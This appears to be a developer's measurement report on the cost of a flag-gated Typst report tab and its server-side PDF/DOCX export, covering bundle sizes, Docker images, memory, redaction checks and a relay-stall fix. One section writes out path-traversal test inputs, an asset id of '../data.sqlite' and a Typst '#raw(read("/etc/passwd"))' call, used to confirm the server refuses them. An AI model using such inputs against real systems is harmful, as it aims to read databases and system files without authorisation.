# What the Typst report tab costs, measured (2026-09-19)

## What this is, and why it is behind a flag

BTCT used to have a Typst report tab. It was cut in the lightweight pass,
along with the graph canvas and the assistant, because the three
`@myriaddreamin/typst*` packages drag 29.3 MB of WebAssembly into the build and
the target box has 1 GB of RAM. The report is still the reason the notes exist,
so it is back, but only for a server started with `ENABLE_TYPST=1`. Everyone
else must keep paying nothing for it.

"Nothing" needs a number, so this is that number. Every figure below came out
of a command I ran on this machine; where I could not measure something I say
so instead of guessing.

## How I measured

- **Machine**: Windows 11, Docker Desktop on WSL2, Chrome 153 headless driven
  over raw CDP. Scripts lived in a scratch folder, never in the repo.
- **Before** is commit `5113732` ("Add design spec for the flag-gated Typst
  report tab"), the last commit with no feature code. I built it from a
  `git worktree` outside the repo so the working tree was never touched.
  **After** is `a530788`, the eighth and last task's parent.
- **Docker**: throwaway image tags (`btct-measure:before` / `:after`), throwaway
  containers run with `--memory 1g --cpus 2` (the target box, not a margin) and
  a throwaway volume each, published on `127.0.0.1` loopback ports. One at a
  time. Everything I created was removed afterwards.
- **Client builds** are `bun install && bun run build` in each tree. Image
  builds are a plain `docker build` of each tree.

## Results

| Metric | Before | After | Pass condition | Result |
|---|---|---|---|---|
| Entry bundle, gzipped bytes | 87,786 | 88,385 (+599) | within 1 KB | **PASS** |
| Flag-off idle memory, three samples | 25.99 / 25.84 / 25.79 MiB | 25.75 / 25.59 / 25.58 MiB | no measurable change | **PASS** |
| Flag-off requests for wasm, fonts, Typst chunks | n/a | 0 of 47 | zero | **PASS** |
| `dist/` bytes | 4,739,426 (230 files) | 43,066,989 (274 files) | recorded | +38,327,563 |
| Typst-only files in `dist/` | n/a | 38,292,537 raw, 16,965,056 gzipped | recorded | see breakdown |
| Image size (`docker images`) | 314MB | 494MB | recorded | +180MB |
| Flag-on first open of the tab | n/a | 17,072,528 B over 37 requests | recorded | about 17 MB, then cached |

### Entry bundle

```
$ (cd ../btct-measure-before && gzip -9 -c dist/assets/index-*.js | wc -c)
87786
$ gzip -9 -c dist/assets/index-*.js | wc -c
88385
```

599 bytes, which is the `typst` field in the feature switches, `features.ts`
itself, the store's `featuresLoaded` flag, `typstTabState`, the off notice, and
the three gated entry points. Under the 1 KB gate with room to spare. The
compiler is not in there, and the grep that proves it still finds nothing:

```
$ grep -l "typst_ts_web_compiler" dist/assets/index-*.js
(no output, exit 1)
```

### `dist/`

```
$ du -sb dist          # before / after
4739426  dist
43066989 dist
```

The Typst-only part of that, raw and gzipped at level 9:

| Group | Files | Raw | Gzipped |
|---|---|---|---|
| Compiler + renderer wasm | 2 | 29,297,603 | 11,122,880 |
| Default fonts (`dist/fonts/`) | 17 | 8,713,432 | 5,763,710 |
| Typst JS chunks | 20 | 281,502 | 78,466 |
| **Total** | **39** | **38,292,537** | **16,965,056** |

The JS list is every new chunk stem in the after build except `mutex-*.js`,
`preload-helper-*.js`, and the `AssetsPanel` / `FigureViewport` /
`PlaceScreenshotDialog` chunks. Those are not Typst cost: they are code that
already existed and that the chunker split out once a second tab started
importing it, and the flag-off browser session below fetches `mutex-*.js`,
`AssetsPanel` and `FigureViewport` while opening an ordinary note. Counting
them would have inflated the figure by 87 kB.

Half of the Typst JS is emitted twice. `typst.ts` ships browser and node entry
points, so `dist/` holds two `compiler-*.js`, two `renderer-*.js`, two
`esm-*.js`, four `wasm-pack-shim-*.js` and so on, of which one variant is ever
loaded. I counted all of them, because all of them are in the image.

### Image

```
$ docker images btct-measure:before --format '{{.Size}}'
314MB
$ docker images btct-measure:after --format '{{.Size}}'
494MB
```

`docker history` shows exactly two layers change, and they change by the same
amount:

```
before:  6.76MB  COPY /app/dist /app/dist
         26.6MB  RUN mkdir -p /data /backups && chown -R bun:bun /data /backups /app
after:   62.6MB  COPY /app/dist /app/dist
         82.4MB  RUN mkdir -p /data /backups && chown -R bun:bun /data /backups /app
```

Inside the containers, `du -sb /app/dist` reads 5,917,442 before and 61,528,590
after, so `dist` plus its precompressed `.gz` siblings grows by 55.6 MB. The
`chown -R` on the last line of the Dockerfile rewrites every file it touches
into a new layer, so it pays that 55.6 MB a second time. That is a
pre-existing property of the Dockerfile, not something this feature
introduced, but it is why the image grows by roughly twice what the feature
adds. Docker's own three size accountings disagree with each other here
(`docker images` says +180MB, summing the two changed history layers says
+111.6MB, `docker image inspect .Size` says +68.7MB); I trusted the `du` inside
the container and did not chase the rest.

### Flag-off idle memory

Each image run alone with `ENABLE_TYPST` unset, `--memory 1g --cpus 2`, two
idle minutes after `/healthz` answered, then three `docker stats --no-stream`
samples ten seconds apart:

```
before:  25.99MiB / 1GiB   25.84MiB / 1GiB   25.79MiB / 1GiB
after:   25.75MiB / 1GiB   25.59MiB / 1GiB   25.58MiB / 1GiB
```

The after image is 0.21 to 0.25 MiB *lower*, which is the honest way of saying
the difference is noise. Within one image the three samples already drift by
0.20 MiB (before) and 0.17 MiB (after) as the server settles, so a 0.2 MiB gap
between images is the same size as the drift inside each. That is the noise
floor I am calling it against: a difference smaller than the spread of
repeated samples of the same thing. This is also the result I expected, since
the server does not parse, read or serve anything differently with the flag
off. The feature is entirely client-side, and the client never asks for it.

### Flag-off network

Headless Chrome, clean profile, against the after image with the flag off
(`GET /api/settings` returned `"features":{"typst":false}`). I loaded the app,
opened the "Engagement Notes" page, typed into it, and opened the Assets tab.

```
window (149 events, 47 requests)
--- matching /wasm|\/fonts\/|[Tt]ypst/ : 0 ---
--- transferred total 0 B ---
```

Zero. The three entry points were absent from the overview, the sidebar and
the command palette, as expected.

### Flag-on first open

Same image, restarted with `ENABLE_TYPST=1`, fresh browser profile, empty
cache. I clicked the sidebar's Report row and let the preview paint.

| Group | Transferred (gzip, on the wire) |
|---|---|
| `typst_ts_web_compiler_bg-*.wasm` | 10,767,929 |
| `typst_ts_renderer_bg-*.wasm` | 355,437 |
| 17 fonts under `/fonts/` | 5,767,215 |
| JS chunks (TypstView, CodeMirror, the shims, the assets rail) | 181,947 |
| **Total, 37 requests** | **17,072,528 B (16.3 MiB)** |

So the honest headline is **about 17 MB on first open** (11.1 MB of wasm, 5.8
MB of fonts, 0.2 MB of JavaScript), not the 11 MB the plan guessed. One request, the dedicated worker's own script, never produced a
`Network.loadingFinished` event, so its 1,287 gzipped bytes are missing from
that total.

What happens on the second open depends on the path, and the two paths differ:

```
$ curl -sD - -o /dev/null .../assets/typst_ts_web_compiler_bg-D2mWRS72.wasm
Cache-Control: public, max-age=31536000, immutable
$ curl -sD - -o /dev/null .../fonts/NewCM10-Regular.otf
Cache-Control: no-cache
ETag: "586328-1789848150000"
$ curl -sD - -o /dev/null -H 'If-None-Match: "586328-1789848150000"' .../fonts/NewCM10-Regular.otf
HTTP/1.1 304 Not Modified
```

The wasm and the JS chunks have hashed filenames and are `immutable`, so they
are never requested again. The fonts are not hashed, so they get the server's
default `no-cache` plus a size-and-mtime ETag: a later load sends 17
conditional requests and gets 17 empty `304`s. That is 17 round trips rather
than 5.5 MB, and on a LAN it does not show, but it is not free the way the
wasm is. Giving the fonts hashed names would close it.

## What the browser pass found

These are not my numbers. They come from the Task 6 verification run against a
real server plus a scratch build, recorded in `task-6-verification.md`, and I
repeat them here so this document is the one place to look:

- First painted page **1256 ms** from the click (re-measured at 1279 ms, and
  1157 ms in a brand new browser context).
- Reopening a closed Report tab repaints from the render cache in **73 ms**,
  before any compile finishes.
- Collaboration between two browser contexts on the same report: **458 ms** one
  way, **471 ms** the other, with remote carets and selection ranges rendering.
- A redaction drawn with a real pointer drag survives into the exported PDF.
  Inflating the image XObject out of the 24,484-byte PDF, the redacted half of
  the figure measures 100% midtone with a standard deviation of 0, and the
  untouched half measures 127.5. The original pattern is not recoverable from
  the export.

My own flag-on run painted its first page **1050 ms** after the click, on a
document with no images, which is consistent with those.

## Things that did not work, or surprised me

- **The render cache never filled.** It was copied over with a write on
  `docKey` change, and in BTCT a mounted preview's `docKey` never changes,
  because switching workspaces empties the tab list and unmounts the preview
  instead of re-keying it. Every `get` missed and nothing was ever stored. The
  fix was an unmount-only effect that writes through refs. The 73 ms reopen
  above is the first measurement where the cache actually does anything.
- **`lib/assets.ts` is in the entry graph.** The old code read an uploaded
  font's family name there, with `await import('./typst-compiler')`. Vite emits
  a dynamic import's chunk *and* its wasm asset, so putting that back would
  have shipped 28 MB of WebAssembly into a flag-off build through a module the
  shell already loads. The family read moved into `TypstView`, which is itself
  a lazy chunk. This is the trap worth remembering: the gate is not "does the
  entry bundle contain the compiler", it is "can any module the shell loads
  reach it, even dynamically".
- **A persisted Report tab ignored the flag entirely.** Tabs live in
  `localStorage` independently of the feature switches, so a tab left open
  before the flag was turned off restored, mounted, and pulled the whole 36 MB
  payload on a server that reported `"typst":false`. It loaded cleanly, which
  is exactly why it was easy to miss. Pruning the tab was the wrong fix, since
  `features.typst` reads false for a moment on every boot and that would delete
  every flag-on operator's tab on every reload. The render is gated instead.
- **The gate was then fed the wrong flag.** The first version read the theme
  store's `loaded`, which also flips from the live `settingsPublic.theme`
  mirror. That mirror carries no feature data at all, so on a flag-on server an
  IndexedDB replay could make `loaded` true while `features.typst` was still
  the default false, and the operator would see "Report tab is turned off"
  flash, or stick. A separate `featuresLoaded`, set only inside the settings
  fetch, fixed it.
- **An 8px test pattern looks unredacted.** `pixelParams` floors the mosaic
  block at 8px, so a checkerboard with an 8px period maps each block onto one
  solid cell and a pixel test reports the image as untouched even though the
  redaction is applied correctly. The verification run lost time to this before
  regenerating the test image at 2px cells. Not a bug, but it will catch the
  next person too.
- **One feature of the old tab did not come back.** The removed version could
  expand the assets rail over the whole tab, with a `Maximize2` button in the
  panel header driving `assetsMax` / `toggleAssetsMax` / `hideAssets` in
  `TypstView` and `fullscreen` / `onToggleFullscreen` / `onHide` on the panel.
  Restoring it would have meant putting those three props on
  `AssetsPanel`'s new `typst` prop, and `AssetsPanel` is shared with the
  Assets Manager tab, so I left it out. The rail is still resizable by
  dragging its divider (double-click resets the default width) and still hides
  and shows from the Assets button in the tab's header, which is what the
  overlay was mostly used for. If it turns out to be missed, it is at git
  revision `8a549fb^`, in `src/components/typst/TypstAssetsPanel.tsx` and
  `src/components/typst/TypstView.tsx`.
- **The font build step was a no-op in Docker.** `scripts/fonts.ts` skips any
  font already on disk, and `public/fonts/` was gitignored but not
  dockerignored, so it rode into the build context and the script downloaded
  nothing. The image build printed `fonts: 17 files in /app/public/fonts` in
  0.3 s, which is what a working fetch and a skipped one look like from the
  outside. Fixed on 2026-09-19: `public/fonts` is dockerignored, the script
  runs at top level so a failure is a non-zero exit, each font is written
  under a `.partial` name and renamed, and the build asserts `dist/fonts`
  holds 17 files. See the proof build in the same day's fix wave.

## What the tab holds open, and when it lets go

While a Report tab is on screen the compiler worker holds the instantiated
compiler wasm (10.8 MB gzipped on the wire, 29.3 MB unpacked in `dist/`), the
renderer wasm, the 17 default faces it parsed at init, and one copy of the
bytes of every image in the workspace, as shadow files. The main thread holds
a second copy of those image bytes in `setTypstShadowFiles`, plus the rendered
SVG cache (capped at 4,000,000 chars, about 8 MB). I have not measured the
resident total in the tab process, so I am not going to quote a number for
it; what I can say is that it used to last for the life of the page. Closing
the tab freed none of it.

It now has a lease. `TypstView` calls `cancelTypstRelease()` when it mounts
and `scheduleTypstRelease()` when it unmounts, and five minutes later
`releaseTypstCompiler()` terminates the worker, rejects anything still in
flight, and drops the fonts and shadow files along with the bookkeeping that
says the worker already has them. The next compile starts a fresh worker and
re-sends both sets, which the tab's asset sync effect has already refilled on
mount.

Five minutes rather than "on unmount" because a pane renders only its active
tab: flicking between the report and a note unmounts the view every time. An
immediate release would turn every one of those switches back into the cold
open measured above, 1050 to 1256 ms to a painted page plus 17 font
revalidations, instead of the 73 ms repaint from the render cache. The render
cache is deliberately not part of the release, which is what makes that 73 ms
possible while the replacement worker is still starting.

## What is still open

- **Steps 2 to 4 of the plan are not implemented.** Server-side PDF and DOCX
  export, an MCP surface for the report, and a notes reader that pulls page
  content into the document are separate later steps. Today the only export is
  the browser's own PDF or SVG.
- **The cosmetic VFS error.** The first compile after the wasm engine boots
  logs one `tinymist-vfs::ProxyAccessModel::read_all failure ... Dummy
  AccessModel` per cold tab open, on a document that references an image. The
  shadow files are staged before the compile, but not inside the wasm
  instance's VFS until it finishes initializing. It self-corrects on the next
  compile and nothing is visibly wrong. It should be silenced.
- **The font upload path is covered at its ends, not in its middle.**
  `src/test/assets-panel-fonts.test.tsx` renders `AssetsPanel` and pins the
  routing: a dropped `.ttf` is rejected in the Assets Manager and handed to
  `onAddFont` in the report rail, and neither path loads the placement
  dialog. What is still untested is what sits between that callback and the
  record: `TypstView`'s `addFont`, which reads the family name through
  `getFontInfo` and swallows a parse failure in a bare `catch`, and the
  store's `addTypstAsset` write of `fontFamily`. Both were verified by hand
  in a browser once. A font whose metadata will not parse degrades to the
  filename with the insert button disabled, which is the intended behaviour
  and also exactly what a silent breakage would look like, so that `catch` is
  the line worth a test.
- **Two `loadTheme()` calls in the same tick start two retry chains.** The
  guard in the settings retry clears a pending timer, which covers a retry
  that is already scheduled, but two calls that race before either has failed
  each schedule their own chain. In practice this is React StrictMode in dev
  double-invoking the effect; production calls it once. Parked knowingly.
- **The render cache is per page load.** It is module state, so a browser
  reload starts empty. Persisting a few MB of SVG per workspace in IndexedDB is
  not obviously worth it on a 1 GB box.
- **The fonts are not content-hashed**, so every load revalidates 17 of them.
  See the cache headers above.

## Server export (step 2), measured in the container

Step 1 compiled the report in the browser. Step 2 adds two buttons that do it
on the server instead: **PDF (server)**, which runs the `typst` CLI, and
**DOCX**, which runs `pandoc`. The point of the second one is that people ask
for Word files. The point of doing either on the server is the same thing that
makes this feature worth the trouble: the screenshots get their crops and
redactions burned into the pixels before anything converts them.

That means two binaries in the image and a jimp bake in the process that also
relays Yjs for the whole team, on a box with 1 GB of RAM. So here are the
numbers, from a `btct-measure:step2` image built from this tree and run with
`--memory 1g --cpus 2`, against `btct-measure:step1` built from commit
`24c7941` in a `git worktree` outside the repo. Nothing used the repo's compose
files; every container, volume and image I made is gone.

### Image size

| | step 1 (`24c7941`) | step 2 | delta |
|---|---|---|---|
| `docker images` SIZE | 418MB | 691MB | +273MB |
| `du -sm /` inside a container from the image | 283 MiB | 488 MiB | **+205 MiB** |

The two disagree and the second one is the honest number. Summing
`docker history` layer sizes gives 296 MB for step 1 and 511 MB for step 2,
which matches `du`; `docker images` SIZE under the containerd image store
counts something else. Every layer is byte-identical between the two images
except four:

```
215MB      COPY /usr/local/bin/typst /usr/local/bin/pandoc /usr/local/bin/
152kB      COPY --chown=bun:bun server/typst/ /app/server/typst/
77.8kB     COPY --chown=bun:bun src/lib/blur-math.ts src/lib/crop-math.ts ...
4.1kB      RUN typst --version && pandoc --version | head -1
```

Inside the image:

```
$ docker run --rm --entrypoint sh btct-measure:step2 -c "ls -l /usr/local/bin/typst /usr/local/bin/pandoc"
-rwxr-xr-x 1 root root 163653648 /usr/local/bin/pandoc
-rwxr-xr-x 1 root root  50889504 /usr/local/bin/typst
```

204.6 MiB of binary for 205 MiB of image, so the modules themselves are
rounding error. pandoc is three times the size of typst, which I did not
expect and cannot do anything about: it is a statically linked Haskell binary
carrying every reader and writer it has. The step 1 baseline already carried
step 2's `jimp` dependency, which `24c7941` had installed, so the +205 MiB is
the two binaries and nothing else; jimp itself is about 11 MB in
`server/node_modules` (`du -sh`: 3.3M for `jimp`, 7.7M for `@jimp`) and was
paid for before this.

A box that will never export can leave both binaries out:
`docker build --build-arg WITH_REPORT_BINS=0`. Measured against the same
tree, that image is 418MB against 691MB by `docker images` and 283 MiB
against 488 MiB by `du -sm /` inside a container, so the saving is the same
205 MiB the binaries cost. The server starts, `/healthz` answers 200,
`GET /api/typst/capabilities` returns `{"pdf":false,"docx":false}` with
`ENABLE_TYPST=1`, and both export routes answer 501 with the binary's name.

The arm64 artefacts are pinned and hashed alongside the amd64 ones, but I
have only ever built and run the amd64 path. The arm64 digests come from the
release assets, not from an image I have booted, so treat that build path as
untested rather than as working.

Both archives are pinned by version **and** by sha256 in the `report-bins`
stage. Neither project publishes a signed checksum file, so I downloaded the
four release artefacts (amd64 and arm64 of each), computed the digests and put
them in the Dockerfile; the build now fails if those bytes ever change. That
is trust on first use, so I also cross-checked all four against the digest
GitHub's own release API reports for the same assets
(`gh api repos/typst/typst/releases/tags/v0.14.2 --jq '.assets[] | {name, digest}'`,
and the same for `jgm/pandoc`). All four match, which is a second observation
of the same stored bytes rather than an upstream signature, and the Dockerfile
now says that next to the digests along with what to re-run on a bump. The build
log shows the verification and the versions, in the fetch stage and again in
the runtime stage, because typst's musl build is static while pandoc's linux
release links against glibc and the runtime base image is not the one that
fetched it:

```
#43 1.983 /tmp/typst.tar.xz: OK
#43 5.695 /tmp/pandoc.tar.gz: OK
#43 6.906 typst 0.14.2 (b33de9de)
#43 6.911 pandoc 3.11
#49 [runtime 22/25] RUN typst --version && pandoc --version | head -1
#49 0.289 typst 0.14.2 (b33de9de)
#49 0.298 pandoc 3.11
```

pandoc 3.11 is the newest release, and it is the version every earlier
measurement in this plan was taken against, so it is what I pinned. typst is
0.14.2 for the same reason.

### With the flag off, nothing changed

Both images, no `ENABLE_TYPST`, healthcheck green, two minutes idle, then three
`docker stats --no-stream` samples ten seconds apart:

| sample | step 1 | step 2 |
|---|---|---|
| 1 | 25.80 MiB | 26.12 MiB |
| 2 | 25.77 MiB | 26.02 MiB |
| 3 | 26.06 MiB | 26.05 MiB |
| cgroup `memory.peak` | 38,383,616 B | 39,555,072 B |

I treat anything inside the spread of one container's own samples as noise, and
that spread is 0.29 MiB for step 1. The gap between the two means is 0.18 MiB,
smaller than that, so: no measurable change. The binaries cost disk, not memory,
because nothing ever execs them.

Then six requests at the flag-off step 2 container, with an account token and
without one:

```
noauth  POST /api/typst/x/export?format=pdf          -> 404 in 0.005849s
token   POST /api/typst/x/export?format=pdf          -> 404 in 0.003905s
noauth  POST /api/typst/ws-main/export?format=docx   -> 404 in 0.004894s
token   POST /api/typst/ws-main/export?format=docx   -> 404 in 0.004364s
noauth  GET  /api/typst/capabilities                 -> 404 in 0.004376s
token   GET  /api/typst/capabilities                 -> 404 in 0.004278s
```

`memory.peak` read 39,555,072 before those six requests and 39,555,072 after,
to the byte, and `memory.current` went down rather than up. Nothing under
`server/typst/` was loaded and jimp was not either.

### With the flag on, one export each

A workspace with a short report: one 1920x1080 screenshot with a pixelate
redaction over its left half in a figure slot, plus a second slot whose caption
is computed rather than a string literal. Seeded through the websocket the way
a client does, with the image uploaded through `POST /api/assets`.

| | PDF | DOCX |
|---|---|---|
| status | 200 | 200 |
| wall time | 0.653 s | 0.383 s |
| output | 63,890 B, `%PDF-1.7` | 12,989 B, a real zip |
| `X-Baked-Images` | 1 | 1 |
| `X-Export-Warnings` | absent | one note (below) |
| container peak | 175,947,776 B (167.8 MiB) | 160,522,240 B (153.1 MiB) |

The DOCX header decodes to exactly what the feature promises to say out loud:

```
["Figure slot 2 (line 31): the caption is computed, so the Word file shows \"Figure\" instead."]
```

A 4K screenshot (3840x2160, 8.3 MP, the largest thing the 10 MP per-image cap
admits from a real display) with the same redaction: 200 in 1.211 s, 148,047 B,
one baked image, container peak 391,639,040 B (373.5 MiB). That is the case the
per-image cap was chosen to keep working, and it works with room left.

### The redaction still holds, in the container

The proof is the same correlation test `server/typst/bake.check.mjs` uses. I ran
the unmodified script from the Windows runs against the container's output, so
the number is directly comparable, and an adapted copy against the 1920x1080
screenshot the timings above used:

| | embedded image | correlation with the original, blurred half | unblurred half | original bytes in the PDF |
|---|---|---|---|---|
| 200x100 reference | 1,112 B vs 6,960 B uploaded | **0.033** (limit 0.25) | 0 pixels changed | absent |
| 1920x1080 | 11,720 B vs 706,682 B uploaded | **-0.000** | 0 pixels changed | absent |

"Original bytes absent" is a 64-byte slice of the source PNG's IDAT data,
searched for in the whole PDF, with a control that finds the same slice in the
source file. The larger screenshot scores better because the pixelate block is
larger relative to the 1 px noise, which is what you would want.

The correlation on its own proves less than it looks. A bake that does nothing
scores 1.000 and a token blur scores 0.464, so it catches a no-op and an
obviously weak stand-in. It does **not** catch a weakened bake: a 2 px
pixelate block scores 0.236 and a gaussian path that keeps the blur but drops
the downscale scores 0.161, and both are under the limit. The block-size floor
and the downscale are what actually make the pixels unrecoverable, and
`blur-math.test.ts` only proves the math returns the right numbers, not that
`bakeBlurs` uses them.

So `bake.check.mjs` now measures three more things, and prints all of them on
every run:

```
gaussian: corr=0.003  pixelate: corr=0.033  (limit 0.25)
pixelate: blockPx=8 runs=13x13 shortest=7px (2px blocks measured 21 runs, shortest 2)
gaussian downscale: real=0.003 downscale-free control=0.161 gap=0.158 (min 0.1)
worker: 16994 B identical to the in-process bake; the webp case exits 1 with no output and says "a.webp: webp images with crop or blur cannot be baked server…"
```

The mosaic's run lengths are measured along both axes of the baked output and
checked against the block `pixelParams` asked for: 13 runs of 7 or 8 pixels
for the real bake, against 21 runs with a 2 pixel minimum for the weakened
one. Nine cells are also checked for flatness in two dimensions, because a
run scan alone would pass for stripes. The gaussian output is compared with a
downscale-free control computed inside the script from the same radius: the
real path keeps 0.003 of the pattern against the control's 0.161, and a bake
that dropped the downscale would *be* the control, so its gap is exactly
0.000. And the reference image is baked through a real `bake-worker.mjs`
child, whose bytes have to match the in-process result, while an un-bakeable
input has to leave no output file, a not-ok result and a refusal out of
`bakeFailureMessage`. That last one is the only check that can guard the
redaction guarantee across the process boundary.

I ran all three as negative controls against patched copies, restored
afterwards and never committed: the 2 px block fails the run-length check
while still scoring 0.236 on the correlation, the downscale-free gaussian
fails on a 0.000 gap while scoring 0.161, and a worker patched to write the
original bytes when `bakeImage` throws fails on "a failed bake must leave no
output file at all".

### Many screenshots in one export, and the reason it needs a budget

This is where the numbers stop being comfortable. Each image below is
3600x2700 (9.72 MP, just under the 10 MP per-image cap), with a pixelate
redaction, so every one goes through jimp in the server process.

| screenshots | total MP | result | wall | container peak | cgroup reclaim events |
|---|---|---|---|---|---|
| 12 | 116.6 | 200 | 11.09 s | 968,105,984 B (923 MiB) | 0 |
| 13 | 126.4 | **422**, the budget | 10.64 s | 868,937,728 B (829 MiB) | 0 |
| 32, with `TYPST_EXPORT_MAX_TOTAL_MP=400` | 311.0 | 200 | 30.08 s | **1,073,741,824 B, the limit exactly** | 3454 |

The 422 reads `This report places about 126 MP of screenshots and the server
exports up to 120 MP at once. Export the PDF from the browser instead, or raise
TYPST_EXPORT_MAX_TOTAL_MP on a server with more memory.`

Two things to say honestly about that table. First, the refusal is not cheap:
it took 10.64 seconds and 829 MiB, because the budget is counted as images are
staged, so twelve of them were read and baked before the thirteenth crossed the
line. On Windows, where the same test ran with unbaked images, the same refusal
took 24 to 38 ms. The cost is the baking, not the check.

Second, the last row is what the default protects against. With the budget
raised to 400 MP the export did finish, and the container was pinned at its
1 GiB ceiling for the whole thirty seconds, reclaiming 3454 times to stay
alive. `OOMKilled` was false and the container never restarted, so I cannot
report a kill. I can report that there was no headroom left at all, and that
the only reason nothing died is that most of what the kernel reclaimed was page
cache.

### The bake is the expensive half, and it stalls the relay

The question the security review could not settle on Windows: crops and blurs
run in the server process, Bun does not hand the memory back between images,
and that process is the Yjs relay. On Windows twelve sequential 10 MP bakes
took the server from 226 MB to a 1557 MB peak. Under a cgroup, JavaScriptCore
might collect much harder. It does, and it still is not enough.

Twelve distinct 3160x3160 screenshots (9.99 MP each, 119.8 MP in total, just
under the default budget), exported to PDF, with the bun process's own `VmRSS`
sampled every 50 ms and `/healthz` polled alongside:

| set | status | wall | container peak | bun process RSS peak | `/healthz` |
|---|---|---|---|---|---|
| 4, blurred | 200 | 4.53 s | 723,935,232 B (690 MiB) | 576,580 kB (563 MiB) | worst poll 3.586 s |
| 8, blurred | 200 | 8.69 s | 935,960,576 B (893 MiB) | 778,596 kB (760 MiB) | one poll timed out at 5 s, next took 1.925 s |
| 12, blurred | 200 | 12.89 s | **1,073,741,824 B, the limit** | **1,004,752 kB (981 MiB)** | **two consecutive polls timed out at 5 s**, next took 0.112 s |
| 12, no blur | 200 | 2.13 s | 704,593,920 B (672 MiB) | 104,224 kB (102 MiB) | worst poll 5.7 ms, no failures |

Nothing was OOM-killed in any run: `OOMKilled=false`, `RestartCount=0`, and
`memory.events` recorded `oom 0 oom_kill 0` throughout. The memory does come
back, which is the one piece of good news against the Windows result: two
minutes after the twelve-image run the bun process was at 97,888 kB (95.6 MiB)
and the cgroup at 59,314,176 B, so this is live working set, not a leak.

The last row is the control and it is the whole finding. The same twelve
pictures, the same compile, nothing redacted: 2.13 seconds instead of 12.89,
102 MiB of bun instead of 981, and a relay that never missed a beat. Every bit
of the cost is the bake. And the bake is synchronous JavaScript on the main
thread, so it does not merely use memory, it stops the event loop: at four
images one health check waited 3.6 seconds, at eight one gave up after 5, and at
twelve two in a row gave up after 5. For a Yjs relay that means every editor in
the workspace stops syncing for roughly ten seconds while somebody exports a
Word file.

So, plainly: **server export of many large redacted screenshots is not safe on a
1 GB box yet** (fixed since; see "After the fix" below). One or two of them is fine and fast, which is the ordinary case
and the one the buttons exist for. A dozen at the top of the per-image cap sits
at the container's memory ceiling and stalls collaboration for seconds at a
time, and the 120 MP budget that admits it was set from the compiler's cost, not
from the bake's. The budget stops the box dying; it does not stop it stuttering.
I am not changing a limit here on my own; the numbers are the point.

#### After the fix

Every redaction now runs in a bun child process of its own, one image at a
time, and `stageReport` sizes and budgets the whole report before it bakes
anything. Same container, same twelve pictures, same 200 ms `/healthz` poll:

| | before | after |
|---|---|---|
| bun relay RSS peak | 1,004,752 kB (981 MiB) | **89,968 kB (87.9 MiB)** |
| worst `/healthz` | two consecutive polls timed out at 5 s | **0.0153 s**, 70 polls, 0 failures |
| container `memory.peak` | 1,073,741,824 B, the limit exactly | 697,643,008 B (665 MiB) |
| wall time | 12.89 s | 16.12 s |
| `OOMKilled` / restarts | false / 0 | false / 0 |

The relay's own working set does not move any more: 79,600 kB before the
export, 89,968 kB at the peak, 81,992 kB two minutes later, with the cgroup
back at 55,128,064 B. The 981 MiB is still spent, but it is spent in a
process that exits, which is why the container total comes down by a third
as well. `memory.events` recorded `oom 0 oom_kill 0` throughout.

The wall time is the price: **+3.23 seconds over twelve images, about 0.27 s
per spawn**, which is bun starting and importing jimp once per picture. The
other twelve-image case in the table above (3600x2700, 116.6 MP) went from
11.09 s to 13.73 s, +2.64 s, about 0.22 s each. A quarter more wall time for
an export that no longer stops every editor in the workspace is a trade I
would take twice.

The over-budget refusal is the other half, and it is the bigger number:

| | before | after |
|---|---|---|
| 13 screenshots, 126.4 MP, time to the 422 | 10.64 s | **0.014 s** |
| memory moved by that refusal | 868,937,728 B (829 MiB) | none measurable, `memory.peak` did not move |

That one is not the child process, it is the two passes: nothing is read for
a second time, decoded or baked until the whole report has been sized and
charged, so a report the server will not export is refused before it has
done any work at all.

Nothing else changed. One ordinary export each way: PDF 200 in 0.626 s,
63,890 B; DOCX 200 in 0.534 s, 12,989 B, both with `X-Baked-Images: 1` and
the computed-caption warning, and both byte-for-byte the same size as before
the fix. The redaction proof gives the same numbers too: 0.033 on the
reference pattern inside the container, and on the 1920x1080 screenshot a
left-half correlation of -0.000, zero pixels changed in the right half, and
the original PNG's IDAT slice absent from the PDF.

Two failure paths, because the guarantee is the point of the feature:

- **A bake that cannot work.** A referenced, blurred `.webp`: 422 in 0.143 s
  (PDF) and 0.128 s (DOCX), reading `secret.webp: webp images with crop or
  blur cannot be baked server-side; export from the app instead`. That
  sentence comes out of the child's `result.json`. Nothing was left in
  `/tmp`, and a 64-byte slice of the original webp appears in neither
  response body.
- **A bake that is killed.** I sent `SIGKILL` to a running bake child four
  seconds into the twelve-image export, which is the signal a cgroup OOM
  sends. The export answered **422 in 4.39 s** with `The export ran out of
  memory on the server. Export the PDF from the browser instead.`, `/healthz`
  answered in 4.7 ms while it happened and 4.3 ms after, the container never
  restarted, and `/tmp` was clean. Before this change that memory pressure
  landed on the relay instead.

Two honest caveats. The cgroup's `memory.current` sampler is useless after
the first heavy run on a container, because the page cache from the previous
export stays resident until something needs the memory; only the first run's
sample and the monotonic `memory.peak` are worth quoting, and those are what
the table uses. And I did not arrange a real cgroup OOM: I sent the same
signal by hand and checked what the code does with it.

### The two hostile inputs, re-checked on Linux

The full attack table was run on Windows. Path forms differ on Linux, so two
spot checks. `/data/data.sqlite` inside the container really does start
`SQLite format 3` and `/etc/passwd` really does start `root:x:0:0`, so both
targets are live.

| input | PDF | DOCX |
|---|---|---|
| asset record with `id: '../data.sqlite'`, as a font, report reads `/fonts/stolen.sqlite` | 422 in 23.6 ms, `file not found (searched at ./fonts/stolen.sqlite)` | 422 in 21.0 ms, `File './fonts/stolen.sqlite' not found in resource path` |
| the same id as an image, report reads `/assets/stolen.png` | 422, `file not found (searched at ./assets/stolen.png)` | (same path) |
| `#raw(read("/etc/passwd"))` | 422 in 19.6 ms, `file not found (searched at ./etc/passwd)` | 422 in 19.9 ms, `File './etc/passwd' not found in resource path` |

The record is skipped by `vetAssetRecord` before any filesystem call, so the
file is never staged and typst reports an unresolved path against its own line.
Grepping every one of those response bodies, and both successful exports, for
`SQLite format`, `root:x:0:0` and `daemon:x:` finds nothing. The paths in the
messages are relative: the scrubber did its job and no temp directory or
account name leaked. No `/tmp/btct-typst-*` directory was left behind by any
run.

### Clicking the buttons

Driven through headless Chrome over raw CDP against the flag-on container, with
the account token injected into `localStorage`.

| check | verdict | evidence |
|---|---|---|
| Report tab opens from the sidebar | PASS | the sidebar's Report row is present and opens the tab |
| `DOCX` and `PDF (server)` are there | PASS | the toolbar's export buttons read `["SVG","PDF","DOCX","PDF (server)"]` |
